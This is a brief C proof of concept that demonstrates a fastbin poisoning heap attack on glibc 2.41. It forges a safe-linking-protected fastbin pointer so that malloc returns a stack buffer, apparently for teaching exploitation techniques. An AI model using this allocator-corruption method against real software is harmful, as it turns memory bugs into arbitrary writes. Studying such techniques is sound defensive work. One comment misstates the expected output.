/*
  This short example illustrates a fastbin poisoning attack in GLIBC 2.41
  This requires more consideration for pointer obfuscation using PROTECT_PTR/REVEAL_PTR
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define PROTECT_PTR(pos, ptr)					\
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)


int main(void) {
  //Initialize buffer to zeroes
  char buf[100] = {0};

  //Create array of pointers
  size_t ptrs[20] = {0};

  //Fill tcache
  //Create 8 pointers in fastbin
  for (int i = 0; i < 14; i++) { ptrs[i] = (size_t)malloc(0x10); }
  for (int i = 0; i < 14; i++) { free((void*)ptrs[i]); }
  
  //Clear tcache
  for (int i = 0; i < 7; i++) { (size_t)malloc(0x10); }

  //Fastbin looks like
  //fb -> ... -> ptrs[7] -> buf -> ???
  *(size_t*)ptrs[7] = (size_t)PROTECT_PTR((void*)ptrs[7], (void*)buf-0x10);

  //tcache looks like
  //tcache -> buf -> ptrs[7] -> ... -> ptrs[12]

  //fastbin looks like
  //fb -> ???
  malloc(0x10);

  //Return head of tcache to get buffer
  char* victim = malloc(0x10);
  strcpy(victim, "H3LLO\n");

  //Write buffer to stdout (should print H3LL0)
  write(1, buf, 7);
  
  return 0;
}
